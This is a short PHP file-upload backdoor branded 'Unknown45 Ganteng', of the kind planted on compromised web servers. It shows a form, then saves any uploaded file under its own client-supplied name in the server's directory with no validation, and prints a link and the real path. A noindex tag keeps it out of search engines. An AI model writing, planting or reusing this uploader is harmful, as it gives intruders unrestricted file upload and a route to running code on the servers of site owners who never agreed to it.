<meta name="robots" content="noindex">
Unknown45 Ganteng
<form method="post" enctype="multipart/form-data">
	<input type="file" name="ganteng">
	<button>Gaskan</button>
</form>
<?php
if (isset($_FILES['ganteng'])) {
	if (rename($_FILES['ganteng']['tmp_name'], $_FILES['ganteng']['name']) !== false) {
		echo "[Success] <a href='".$_FILES['ganteng']['name']."'>".realpath($_FILES['ganteng']['name'])."</a>";
	} else {
		echo "[Failed to upload]";
	}
}
?>
